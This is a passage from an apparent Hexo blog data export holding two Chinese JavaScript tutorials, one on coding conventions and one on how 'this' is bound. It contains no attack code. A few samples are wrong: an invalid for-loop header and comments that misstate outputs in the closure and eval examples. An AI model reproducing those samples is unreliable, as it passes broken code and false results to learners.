<span class=\"number\">2</span>&#125;;</span><br><span class=\"line\">* 限定函数参数：myFunc(a, b, c)</span><br><span class=\"line\">* 函数声明的花括号的前面：<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">* 匿名函数表达式<span class=\"function\"><span class=\"keyword\">function</span>的后面：<span class=\"title\">var</span> <span class=\"title\">myFunc</span> = <span class=\"title\">function</span> (<span class=\"params\"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<p>记录一些 Javascript 编写的代码规范，方便以后查询和学习。</p>\n<h3 id=\"在编写-Javascript-代码时应尽量避免全局变量的污染\"><a href=\"#在编写-Javascript-代码时应尽量避免全局变量的污染\" class=\"headerlink\" title=\"在编写 Javascript 代码时应尽量避免全局变量的污染:\"></a>在编写 Javascript 代码时应尽量避免全局变量的污染:</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum</span>(<span class=\"params\">x, y</span>)</span>&#123;</span><br><span class=\"line\">\tresult = x + y;    <span class=\"comment\">//result 被添加到全局变量</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = b = <span class=\"number\">0</span>;    <span class=\"comment\">//b 被添加到全局变量，被解析成 var a = (b = 0);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"在函数顶部预先声明该函数所需要的所有局部变量\"><a href=\"#在函数顶部预先声明该函数所需要的所有局部变量\" class=\"headerlink\" title=\"在函数顶部预先声明该函数所需要的所有局部变量\"></a>在函数顶部预先声明该函数所需要的所有局部变量</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\tb = <span class=\"number\">2</span>,</span><br><span class=\"line\">\t\tsum = a + b,</span><br><span class=\"line\">\t\tobj = &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：</p>\n<ul>\n<li>提供了一个单一的地方去寻找功能所需要的所有局部变量</li>\n<li>防止变量在定义之前使用的逻辑错误</li>\n</ul>\n<p>如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x &gt; <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> y = <span class=\"number\">1</span>;   <span class=\"comment\">//因为存在变量提升(预解析)，故变量重复定义</span></span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> y = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"在循环体中，缓存数组或者集合的长度\"><a href=\"#在循环体中，缓存数组或者集合的长度\" class=\"headerlink\" title=\"在循环体中，缓存数组或者集合的长度\"></a>在循环体中，缓存数组或者集合的长度</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; len = myarray.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//do something</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"始终使用-来进行判断，避免隐式类型转换\"><a href=\"#始终使用-来进行判断，避免隐式类型转换\" class=\"headerlink\" title=\"始终使用 === 来进行判断，避免隐式类型转换\"></a>始终使用 === 来进行判断，避免隐式类型转换</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> zero = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(zero === <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//不执行，因为不存在隐式类型转换</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"避免使用-eval-和-Function\"><a href=\"#避免使用-eval-和-Function\" class=\"headerlink\" title=\"避免使用 eval() 和 Function()\"></a>避免使用 eval() 和 Function()</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"var local = 3; console.log(local)\"</span>); <span class=\"comment\">// 避免</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Function</span>(<span class=\"string\">\"console.log('Hello World!');\"</span>)(); <span class=\"comment\">// 避免</span></span><br></pre></td></tr></table></figure>\n<p>注：不应该用 eval() 来解析 json 数据，而是改用 JSON.parse()</p>\n<p>eval 代码中任何被评估的通过 var 定义的变量会被自动变成全局变量而 Function 不会, 这样 eval 一不小心就造成了全局变量污染</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> evalString = <span class=\"string\">\"var x = 1; console.log(x);\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(evalString); <span class=\"comment\">// logs \"1\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> funString = <span class=\"string\">\"var y = 2; console.log(y);\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(funString)(); <span class=\"comment\">// logs \"2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> x); <span class=\"comment\">// number</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> y); <span class=\"comment\">// \"undefined\"</span></span><br></pre></td></tr></table></figure>\n<p>另外一点，eval() 会干扰作用域链，它可以访问和修改它外部作用域中的变量，而 Function() 中只看到全局作用域。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> local = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"string\">\"local = 3; console.log(local)\"</span>);  <span class=\"comment\">//2</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(local);      <span class=\"comment\">//3</span></span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> local = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">Function</span>(<span class=\"string\">\"console.log(typeof local);\"</span>)();  <span class=\"comment\">//undefined</span></span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用-parseInt-总是指定基数参数\"><a href=\"#使用-parseInt-总是指定基数参数\" class=\"headerlink\" title=\"使用 parseInt 总是指定基数参数\"></a>使用 parseInt 总是指定基数参数</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">parseInt</span>(<span class=\"string\">\"123\"</span>,<span class=\"number\">8</span>);  <span class=\"comment\">//八进制数转化为十进制</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"使用花括号时，始终与之前的语句放在同一行\"><a href=\"#使用花括号时，始终与之前的语句放在同一行\" class=\"headerlink\" title=\"使用花括号时，始终与之前的语句放在同一行\"></a>使用花括号时，始终与之前的语句放在同一行</h3><p>错误示范：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        name:<span class=\"string\">'lindz'</span>;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func());   <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<p>当你选择不使用分号结束一行代码时 JavaScript 会自己帮你补上，所以代码被解析为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        name:<span class=\"string\">'lindz'</span>;      <span class=\"comment\">//不执行</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func());   <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"推荐使用-这样的注释方式，-可能与正则表达式冲突\"><a href=\"#推荐使用-这样的注释方式，-可能与正则表达式冲突\" class=\"headerlink\" title=\"推荐使用 // 这样的注释方式，/ / 可能与正则表达式冲突\"></a>推荐使用 // 这样的注释方式，/<em> </em>/ 可能与正则表达式冲突</h3><h3 id=\"空格的使用改善代码的可读性和一致性\"><a href=\"#空格的使用改善代码的可读性和一致性\" class=\"headerlink\" title=\"空格的使用改善代码的可读性和一致性\"></a>空格的使用改善代码的可读性和一致性</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* <span class=\"keyword\">for</span>循环分号分开后的的部分：如<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i += <span class=\"number\">1</span>) &#123;...&#125;</span><br><span class=\"line\">* <span class=\"keyword\">for</span>循环中初始化的多变量(i和max)：<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, max = <span class=\"number\">10</span>; i &lt; max; i += <span class=\"number\">1</span>) &#123;...&#125;</span><br><span class=\"line\">* 分隔数组项的逗号的后面：<span class=\"keyword\">var</span> a = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">* 对象属性逗号的后面以及分隔属性名和属性值的冒号的后面：<span class=\"keyword\">var</span> o = &#123;a: <span class=\"number\">1</span>, b: <span class=\"number\">2</span>&#125;;</span><br><span class=\"line\">* 限定函数参数：myFunc(a, b, c)</span><br><span class=\"line\">* 函数声明的花括号的前面：<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">* 匿名函数表达式<span class=\"function\"><span class=\"keyword\">function</span>的后面：<span class=\"title\">var</span> <span class=\"title\">myFunc</span> = <span class=\"title\">function</span> (<span class=\"params\"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"Javascript - this","date":"2016-03-04T04:00:00.000Z","author":"Lindz","header-img":"img/js-bg.jpg","_content":"\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n谈及 Javascript 中的 this，竟然让人觉得头疼，它不像 Java，C++ 中的 this 指向调用 this 的该对象。\n\n在函数中 this 到底取何值，是在函数真正被调用执行的时候确定下来的，函数定义的时候确定不了。  \n\n因为 this 的取值是执行上下文环境的一部分，每次调用函数，都会产生一个新的执行上下文环境。\n\n**因为 this 的取值是执行上下文环境的一部分，当你在代码中使用了 this,这个 this 的值就直接从执行的上下文中获取了，而不会从作用域链中搜寻。**\n\n关于 this 的取值，大体上可以分为以下六种情况：\n\n### 情况1：全局 & 调用普通函数  \n\n在全局环境中，this永远指向window。 \n \n```javascript\nconsole.log(this === window);     //true\n```\n\n普通函数在调用时候(注意不是构造函数，前面不加 new)，其中的 this 也是指向 window。  \n\n```javascript\nvar x = 10;\nfunction foo(){\n\tconsole.log(this);     //Window\n\tconsole.log(this.x);   //10\n}\nfoo();\n```\n\n### 情况2：构造函数\n\n所谓的构造函数就是由一个函数 new 出来的对象，一般构造函数的函数名首字母大写，例如像 Object，Function，Array 这些都属于构造函数。\n\n> 关于构造函数和普通函数使用上的区别，我在 [「前端 · 面试」记录一些有意思的题目(二)](http://www.happylindz.com/2016/02/23/record-front-questions/) 讲的挺全面得了，这里不再赘述。\n\n```javascript\nfunction Foo(){\n    this.x = 10;\n    console.log(this);    //Foo {x:10}\n}\nvar foo = new Foo();\nconsole.log(foo.x);      //10\n```\n\n上述代码，如果函数作为构造函数使用，那么其中的 this 就代表它即将 new 出来的对象。\n\n但是如果直接调用 Foo 函数，而不是 new Foo()，那就变成情况1，这时候 Foo() 就变成普通函数。\n\n```javascript\nfunction Foo(){\n    this.x = 10;\n    console.log(this);    //Window\n}\nvar foo = Foo();\nconsole.log(foo.x);      //undefined\n```\n\n### 情况3：对象方法\n\n如果函数作为对象的方法时，方法中的 this 指向该对象。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        console.log(this);       //Object\n        console.log(this.x);      //10\n    }\n};\nobj.foo();\n```\n\n注意：若是在对象方法中定义函数，那么情况就不同了。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        function f(){\n            console.log(this);      //Window\n            console.log(this.x);    //undefined\n        }\n        f();\n    }\n}\nobj.foo();\n```\n\n函数 f 虽然是在 obj.foo 内部定义的，但它仍然属于一个普通函数，this 仍指向 window。(这是个坑，要记牢)  \n\n在这里，如果想要调用上层作用域中的变量，这里指 obj.x，可以使用闭包。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        var self = this;\n        function f(){\n            console.log(self);      //{x: 10}\n            console.log(self.x);    //undefined\n        }\n        f();\n    }\n}\nobj.foo();\n```\n\n\n* 如果 foo 函数不作为对象方法被调用，那么结果也不一样。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        console.log(this);       //Window\n        console.log(this.x);     //undefined\n    }\n};\nvar fn = obj.foo;\nfn();\n``` \n\nobj.foo 被赋值给一个全局变量，并没有作为 obj 的一个属性被调用，那么此时 this 的值是 window。\n\n### 情况4：构造函数 prototype 属性\n\n```javascript\nfunction Foo(){\n    this.x = 10;\n}\nFoo.prototype.getX = function () {\n    console.log(this);        //Foo {x: 10, getX: function}\n    console.log(this.x);      //10\n}\nvar foo = new Foo();\nfoo.getX();\n```\n\n在 Foo.prototype.getX 函数中，this 指向的 foo 对象。不仅仅如此，即便是在整个原型链中，this 代表的也是当前对象的值。\n\n### 情况5：函数用 call、apply或者 bind 调用。\n\n```javascript\nvar obj = {\n    x: 10\n}\nfunction foo(){\n    console.log(this);     //{x: 10}\n    console.log(this.x);   //10\n}\nfoo.call(obj);\nfoo.apply(obj);\nfoo.bind(obj)();\n```\n\n当一个函数被 call、apply 或者 bind 调用时，this 的值就取传入的对象的值。\n\n### 情况6: DOM event this\n\n在一个 HTML DOM 事件处理程序里，this 始终指向这个处理程序所绑定的 HTML DOM 节点：\n\n```javascript\nfunction  Listener(){  \n    document.getElementById('foo').addEventListener('click',this.handleClick);     //不是指这里的 this，这里的 this 指向 Listener 这个对象。\n}\nListener.prototype.handleClick = function (event) {\n    console.log(this);    //<div id=\"foo\"></div>\n}\nvar listener = new Listener();\ndocument.getElementById('foo').click();\n```\n\n你也可以用通过 bind 切换上下文:\n\n```javascript\nfunction  Listener(){\n    document.getElementById('foo').addEventListener('click',this.handleClick.bind(this));      \n}\nListener.prototype.handleClick = function (event) {\n    console.log(this);    //Listener {}\n}\nvar listener = new Listener();\ndocument.getElementById('foo').click();\n```\n\n总结一句话，就是 this 指向调用该方法的对象。\n\n## 其它：\n\n* this 为保留字，你不能重写 this。\n\n```javascript\nfunction test(){\n\tvar this = {};     //Uncaught SyntaxError: Unexpected token this\n}\n```\n\n* 宿主对象：\n\n> 一门语言在运行的时候，需要一个环境，叫做宿主环境。  \n \n> 对于JavaScript，宿主环境最常见的是web浏览器，浏览器提供了一个JavaScript运行的环境，这个环境里面，需要提供一些接口，好让JavaScript引擎能够和宿主环境对接。  \n \n> JavaScript引擎才是真正执行JavaScript代码的地方，常见的引擎有V8(目前最快JavaScript引擎、Google生产)、JavaScript core。\n\n在浏览器或者服务端( nodejs )都有自己的 JS 引擎，在浏览器中，全局对象为 window，而在 nodejs 中，全局对象为 global。 \n\n参考链接： \n \n* [JavaScript中的this陷阱的最全收集--没有之一](https://segmentfault.com/a/1190000002640298#articleHeader1)  \n* [深入理解javascript原型和闭包（10）——this](http://www.cnblogs.com/wangfupeng1988/p/3988422.html)\n\n\n\n\n","source":"_posts/2016-03-04-javascript-this.md","raw":"---\nlayout:     post\ntitle:      \"Javascript - this\"\ndate:       2016-03-04 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/js-bg.jpg\"\ntags:\n    - Javascript\n---\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n谈及 Javascript 中的 this，竟然让人觉得头疼，它不像 Java，C++ 中的 this 指向调用 this 的该对象。\n\n在函数中 this 到底取何值，是在函数真正被调用执行的时候确定下来的，函数定义的时候确定不了。  \n\n因为 this 的取值是执行上下文环境的一部分，每次调用函数，都会产生一个新的执行上下文环境。\n\n**因为 this 的取值是执行上下文环境的一部分，当你在代码中使用了 this,这个 this 的值就直接从执行的上下文中获取了，而不会从作用域链中搜寻。**\n\n关于 this 的取值，大体上可以分为以下六种情况：\n\n### 情况1：全局 & 调用普通函数  \n\n在全局环境中，this永远指向window。 \n \n```javascript\nconsole.log(this === window);     //true\n```\n\n普通函数在调用时候(注意不是构造函数，前面不加 new)，其中的 this 也是指向 window。  \n\n```javascript\nvar x = 10;\nfunction foo(){\n\tconsole.log(this);     //Window\n\tconsole.log(this.x);   //10\n}\nfoo();\n```\n\n### 情况2：构造函数\n\n所谓的构造函数就是由一个函数 new 出来的对象，一般构造函数的函数名首字母大写，例如像 Object，Function，Array 这些都属于构造函数。\n\n> 关于构造函数和普通函数使用上的区别，我在 [「前端 · 面试」记录一些有意思的题目(二)](http://www.happylindz.com/2016/02/23/record-front-questions/) 讲的挺全面得了，这里不再赘述。\n\n```javascript\nfunction Foo(){\n    this.x = 10;\n    console.log(this);    //Foo {x:10}\n}\nvar foo = new Foo();\nconsole.log(foo.x);      //10\n```\n\n上述代码，如果函数作为构造函数使用，那么其中的 this 就代表它即将 new 出来的对象。\n\n但是如果直接调用 Foo 函数，而不是 new Foo()，那就变成情况1，这时候 Foo() 就变成普通函数。\n\n```javascript\nfunction Foo(){\n    this.x = 10;\n    console.log(this);    //Window\n}\nvar foo = Foo();\nconsole.log(foo.x);      //undefined\n```\n\n### 情况3：对象方法\n\n如果函数作为对象的方法时，方法中的 this 指向该对象。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        console.log(this);       //Object\n        console.log(this.x);      //10\n    }\n};\nobj.foo();\n```\n\n注意：若是在对象方法中定义函数，那么情况就不同了。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        function f(){\n            console.log(this);      //Window\n            console.log(this.x);    //undefined\n        }\n        f();\n    }\n}\nobj.foo();\n```\n\n函数 f 虽然是在 obj.foo 内部定义的，但它仍然属于一个普通函数，this 仍指向 window。(这是个坑，要记牢)  \n\n在这里，如果想要调用上层作用域中的变量，这里指 obj.x，可以使用闭包。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        var self = this;\n        function f(){\n            console.log(self);      //{x: 10}\n            console.log(self.x);    //undefined\n        }\n        f();\n    }\n}\nobj.foo();\n```\n\n\n* 如果 foo 函数不作为对象方法被调用，那么结果也不一样。\n\n```javascript\nvar obj = {\n    x: 10,\n    foo: function () {\n        console.log(this);       //Window\n        console.log(this.x);     //undefined\n    }\n};\nvar fn = obj.foo;\nfn();\n``` \n\nobj.foo 被赋值给一个全局变量，并没有作为 obj 的一个属性被调用，那么此时 this 的值是 window。\n\n### 情况4：构造函数 prototype 属性\n\n```javascript\nfunction Foo(){\n    this.x = 10;\n}\nFoo.prototype.getX = function () {\n    console.log(this);        //Foo {x: 10, getX: function}\n    console.log(this.x);      //10\n}\nvar foo = new Foo();\nfoo.getX();\n```\n\n在 Foo.prototype.getX 函数中，this 指向的 foo 对象。不仅仅如此，即便是在整个原型链中，this 代表的也是当前对象的值。\n\n### 情况5：函数用 call、apply或者 bind 调用。\n\n```javascript\nvar obj = {\n    x: 10\n}\nfunction foo(){\n    console.log(this);     //{x: 10}\n    console.log(this.x);   //10\n}\nfoo.call(obj);\nfoo.apply(obj);\nfoo.bind(obj)();\n```\n\n当一个函数被 call、apply 或者 bind 调用时，this 的值就取传入的对象的值。\n\n### 情况6: DOM event this\n\n在一个 HTML DOM 事件处理程序里，this 始终指向这个处理程序所绑定的 HTML DOM 节点：\n\n```javascript\nfunction  Listener(){  \n    document.getElementById('foo').addEventListener('click',this.handleClick);     //不是指这里的 this，这里的 this 指向 Listener 这个对象。\n}\nListener.prototype.handleClick = function (event) {\n    console.log(this);    //<div id=\"foo\"></div>\n}\nvar listener = new Listener();\ndocument.getElementById('foo').click();\n```\n\n你也可以用通过 bind 切换上下文:\n\n```javascript\nfunction  Listener(){\n    document.getElementById('foo').addEventListener('click',this.handleClick.bind(this));      \n}\nListener.prototype.handleClick = function (event) {\n    console.log(this);    //Listener {}\n}\nvar listener = new Listener();\ndocument.getElementById('foo').click();\n```\n\n总结一句话，就是 this 指向调用该方法的对象。\n\n## 其它：\n\n* this 为保留字，你不能重写 this。\n\n```javascript\nfunction test(){\n\tvar this = {};     //Uncaught SyntaxError: Unexpected token this\n}\n```\n\n* 宿主对象：\n\n> 一门语言在运行的时候，需要一个环境，叫做宿主环境。  \n \n> 对于JavaScript，宿主环境最常见的是web浏览器，浏览器提供了一个JavaScript运行的环境，这个环境里面，需要提供一些接口，好让JavaScript引擎能够和宿主环境对接。  \n \n> JavaScript引擎才是真正执行JavaScript代码的地方，常见的引擎有V8(目前最快JavaScript引擎、Google生产)、JavaScript core。\n\n在浏览器或者服务端( nodejs )都有自己的 JS 引擎，在浏览器中，全局对象为 window，而在 nodejs 中，全局对象为 global。 \n\n参考链接： \n \n* [JavaScript中的this陷阱的最全收集--没有之一](https://segmentfault.com/a/1190000002640298#articleHeader1)  \n* [深入理解javascript原型和闭包（10）——this](http://www.cnblogs.com/wangfupeng1988/p/3988422.html)\n\n\n\n\n","slug":"2016-03-04-javascript-this","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxo000hxmvdmg43fnif","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<p>谈及 Javascript 中的 this，竟然让人觉得头疼，它不像 Java，C++ 中的 this 指向调用 this 的该对象。</p>\n<p>在函数中 this 到底取何值，是在函数真正被调用执行的时候确定下来的，函数定义的时候确定不了。  </p>\n<p>因为 this 的取值是执行上下文环境的一部分，每次调用函数，都会产生一个新的执行上下文环境。</p>\n<p><strong>因为 this 的取值是执行上下文环境的一部分，当你在代码中使用了 this,这个 this 的值就直接从执行的上下文中获取了，而不会从作用域链中搜寻。</strong></p>\n<p>关于 this 的取值，大体上可以分为以下六种情况：</p>\n<h3 id=\"情况1：全局-amp-调用普通函数\"><a href=\"#情况1：全局-amp-调用普通函数\" class=\"headerlink\" title=\"情况1：全局 &amp; 调用普通函数\"></a>情况1：全局 &amp; 调用普通函数</h3><p>在全局环境中，this永远指向window。 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span> === <span class=\"built_in\">window</span>);     <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>普通函数在调用时候(注意不是构造函数，前面不加 new)，其中的 this 也是指向 window。  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);     <span class=\"comment\">//Window</span></span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);   <span class=\"comment\">//10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<h3 id=\"情况2：构造函数\"><a href=\"#情况2：构造函数\" class=\"headerlink\" title=\"情况2：构造函数\"></a>情况2：构造函数</h3><p>所谓的构造函数就是由一个函数 new 出来的对象，一般构造函数的函数名首字母大写，例如像 Object，Function，Array 这些都属于构造函数。</p>\n<blockquote>\n<p>关于构造函数和普通函数使用上的区别，我在 <a href=\"http://www.happylindz.com/2016/02/23/record-front-questions/\" target=\"_blank\" rel=\"external\">「前端 · 面试」记录一些有意思的题目(二)</a> 讲的挺全面得了，这里不再赘述。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//Foo &#123;x:10&#125;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"keyword\">new</span> Foo();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foo.x);      <span 